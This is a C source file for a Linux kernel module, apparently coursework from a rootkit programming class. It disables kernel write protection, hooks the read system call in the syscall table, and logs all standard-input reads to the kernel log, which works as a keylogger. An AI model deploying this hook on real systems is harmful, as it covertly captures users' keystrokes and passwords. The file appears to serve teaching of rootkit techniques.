/*  
 *  mod.c - The first kernel module.
*/
#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif
#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
//#include <linux/list.h>
// Why can nr_processes be called directly?
#include <linux/sched.h>
#include "sysmap.h"
#include <asm/page.h>
#include <asm/pgtable.h>
#include <asm/unistd.h>
#include <asm/processor-flags.h>

#define DRIVER_AUTHOR "Rootkit Programming"
#define DRIVER_DESC   "Assigment 1 - 5 LKM Programming"


// cast sys_call_table
unsigned long *sys_call_table = (unsigned long *) sys_call_table_R;

// cast pages function
void (*pages_rw)(struct page *page, int numpages) =  (void *) set_pages_rw_T;
void (*pages_ro)(struct page *page, int numpages) =  (void *) set_pages_ro_T;

struct page * _sys_call_pages;

asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
asmlinkage long my_read(unsigned int fd, char __user *buf, size_t count){
  long t =(*original_read)(fd,buf,count);
 
  if(fd == 0){
    printk(KERN_INFO "%s", buf);
  }
  return t;
  }

static void print_nr_procs()
{
  // cast system symbol adress to function pointer
  int a = ((int (*)(void))nr_processes_T)();
  printk(KERN_INFO "Number of current running processes (cast system symbol adress to function pointer): %d\n", a);
}

static int __init mod_init(void)
{
  printk(KERN_INFO "Welcome!\n");
  print_nr_procs();

  write_cr0 (read_cr0 () & (~ X86_CR0_WP));
   _sys_call_pages = virt_to_page(sys_call_table);
  pages_rw(_sys_call_pages,1);
  printk(KERN_INFO "change to read write\n");

  original_read = (void *) sys_call_table[__NR_read];
  sys_call_table[__NR_read] = (long) my_read;
  write_cr0 (read_cr0 () | X86_CR0_WP);
  return 0;
}

static void __exit mod_exit(void)
{
  write_cr0 (read_cr0 () & (~ X86_CR0_WP));
  
  sys_call_table[__NR_read] = (long) original_read;

  pages_ro(_sys_call_pages,1);
  printk(KERN_INFO "change to read only\n");
  write_cr0 (read_cr0 () | X86_CR0_WP);
  printk(KERN_INFO "Goodbye!\n");
}


    
module_init(mod_init);
module_exit(mod_exit);

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_LICENSE("GPL");

